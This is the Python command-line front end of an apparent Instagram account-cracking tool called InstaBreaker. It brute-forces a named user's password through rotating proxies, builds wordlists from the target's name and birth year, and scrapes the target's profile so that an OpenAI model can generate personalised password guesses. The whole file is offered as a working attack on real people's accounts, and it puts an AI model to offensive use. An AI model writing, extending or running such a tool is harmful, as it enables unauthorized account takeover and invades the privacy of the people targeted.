import asyncio
import typer
from typing import Optional, List
from pathlib import Path

from .utils.display import display
from .utils.config import settings
from .core.engine import BreakerEngine
from .core.wordlist import WordlistGenerator
from .core.session import SessionManager
from .utils.scraper import ProfileScraper
from .core.ai_engine import AIEngine

app = typer.Typer(help="InstaBreaker 2026 Ultra Edition: Advanced Instagram Security Suite.")

@app.command()
def attack(
    username: str = typer.Argument(..., help="Target Instagram username"),
    wordlist: Optional[Path] = typer.Option(None, "--wordlist", "-w", help="Path to wordlist file"),
    proxy_file: Optional[Path] = typer.Option(None, "--proxies", "-p", help="Path to proxies file"),
    ai: bool = typer.Option(False, "--ai", help="Use AI to analyze profile and generate wordlist"),
    resume: bool = typer.Option(True, "--resume/--no-resume", help="Resume from last checkpoint"),
):
    """Start an advanced brute-force attack."""
    display.banner()
    
    proxies = []
    if proxy_file and proxy_file.exists():
        proxies = proxy_file.read_text().splitlines()
        display.log(f"Loaded {len(proxies)} proxies.")

    passwords = []
    if wordlist:
        if wordlist.exists():
            passwords = wordlist.read_text().splitlines()
        else:
            display.error(f"Wordlist file not found: {wordlist}")
            raise typer.Exit(1)
    elif ai:
        if not settings.openai_api_key:
            display.error("OpenAI API key not set. Use 'instabreaker config --openai-key KEY'.")
            raise typer.Exit(1)
            
        display.log(f"Scraping profile data for {username}...")
        scraper = ProfileScraper()
        profile_data = asyncio.run(scraper.scrape_profile(username))
        
        if not profile_data:
            display.warning("Could not scrape profile data. AI generation might be less accurate.")
            profile_data = {"username": username}
            
        display.log("Generating AI wordlist...")
        ai_engine = AIEngine()
        try:
            passwords = asyncio.run(ai_engine.generate_wordlist(profile_data))
            display.success(f"Generated {len(passwords)} AI-optimized passwords.")
        except Exception as e:
            display.error(f"AI generation failed: {e}")
            raise typer.Exit(1)
    else:
        name = typer.prompt("Enter target's name (if known)", default=username)
        year = typer.prompt("Enter target's birth year (if known)", default="")
        generator = WordlistGenerator()
        passwords = generator.generate_from_template(name, year)

    if not passwords:
        display.error("No passwords to test.")
        raise typer.Exit(1)

    engine = BreakerEngine(username, passwords, proxies=proxies)
    
    found = asyncio.run(engine.run(resume=resume))

    if found:
        # The engine already logged success
        pass
    else:
        display.error("\nAttack finished. No password found.")

@app.command()
def config(
    openai_key: Optional[str] = typer.Option(None, "--openai-key", help="Set OpenAI API Key"),
    timeout: Optional[int] = typer.Option(None, "--timeout", help="Set default timeout")
):
    """Manage configuration."""
    if openai_key:
        env_path = Path(".env")
        lines = []
        if env_path.exists():
            lines = env_path.read_text().splitlines()
        
        new_lines = [l for l in lines if not l.startswith("OPENAI_API_KEY=")]
        new_lines.append(f"OPENAI_API_KEY={openai_key}")
        env_path.write_text("\n".join(new_lines))
        display.success("OpenAI API Key saved to .env")
    
    # Show current config
    display.log(f"OpenAI API Key: {'Set' if settings.openai_api_key else 'Not set'}")
    display.log(f"Default Timeout: {settings.default_timeout}")

@app.command()
def generate_wordlist(
    output: Path = typer.Option(..., "--output", "-o", help="Output file path"),
    username: Optional[str] = typer.Option(None, "--username", "-u", help="Target username for AI analysis"),
    ai: bool = typer.Option(False, "--ai", help="Use AI to generate wordlist"),
):
    """Generate a wordlist for later use."""
    display.banner()
    passwords = []
    
    if ai:
        if not settings.openai_api_key:
            display.error("OpenAI API key not set.")
            raise typer.Exit(1)
        
        info = ""
        if username:
            scraper = ProfileScraper()
            profile_data = asyncio.run(scraper.scrape_profile(username))
            info = str(profile_data)
        else:
            info = typer.prompt("Enter any known profile info")
            
        ai_engine = AIEngine()
        display.log("Generating AI wordlist...")
        try:
            # Reusing the generate_wordlist but it expects a dict if we use AIEngine
            # or we can just use the prompt
            if username:
                 passwords = asyncio.run(ai_engine.generate_wordlist(profile_data))
            else:
                 passwords = asyncio.run(ai_engine.generate_wordlist({"bio": info}))
        except Exception as e:
            display.error(f"AI generation failed: {e}")
            raise typer.Exit(1)
    else:
        name = typer.prompt("Enter target's name")
        year = typer.prompt("Enter target's birth year", default="")
        generator = WordlistGenerator()
        passwords = generator.generate_from_template(name, year)
    
    output.write_text("\n".join(passwords))
    display.success(f"Wordlist saved to {output}")

@app.command()
def sessions(
    action: str = typer.Argument("list", help="Action to perform: list, delete"),
    username: Optional[str] = typer.Argument(None, help="Username for delete action")
):
    """Manage saved sessions."""
    display.banner()
    if action == "list":
        sessions_list = SessionManager.list_sessions()
        if not sessions_list:
            display.log("No saved sessions found.")
            return
        display.show_table("Saved Sessions", ["Username"], [[s] for s in sessions_list])
    elif action == "delete":
        if not username:
            display.error("Username is required for delete action.")
            return
        mgr = SessionManager(username)
        mgr.delete_session()
        display.success(f"Session for {username} deleted.")

if __name__ == "__main__":
    app()
